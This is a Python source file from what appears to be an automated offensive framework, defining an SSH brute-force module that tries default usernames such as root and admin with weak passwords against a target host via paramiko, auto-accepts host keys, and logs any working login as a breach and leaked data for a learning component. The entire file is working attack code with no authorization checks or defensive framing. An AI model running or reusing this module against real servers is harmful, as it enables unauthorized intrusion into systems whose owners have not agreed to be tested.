# src/attacks/ssh_bruteforce.py — v15.3
import asyncio
import paramiko
from typing import Dict, Any
from src.core.logger import RealTimeLogger

class SSHBruteforceModule:
    def __init__(self, logger: RealTimeLogger, brain=None, config: Dict = None):
        self.logger = logger
        self.brain = brain
        self.config = config or{}

    async def attack(self, target: str, options: Dict[str, Any]) -> Dict[str, Any]:
        result = {"attack": "ssh_bruteforce", "success": False, "risk": 9}

        host = options['context']['target'].split('/')[2].split(':')[0]
        port = 22

        users = ["root", "admin", "user", "ubuntu"]
        passwords = ["", "password", "123456", "admin", "root"]

        self.logger.info(f"SSH BRUTEFORCE → {host}:{port}")

        for user in users:
            for pwd in passwords:
                ssh = paramiko.SSHClient()
                ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                try:
                    await asyncio.to_thread(
                        ssh.connect,
                        host, port=port, username=user, password=pwd, timeout=3
                    )
                    result.update({
                        "success": True,
                        "vulnerable_payload": f"{user}:{pwd}",
                        "data_leaked": {"user": user, "password": pwd}
                    })
                    self.logger.breach(f"SSH: {user}:{pwd}")
                    if self.brain:
                        self.brain.learn("ssh_bruteforce", target, f"{user}:{pwd}", True)
                    ssh.close()
                    return result
                except:
                    ssh.close()
                    continue

        return result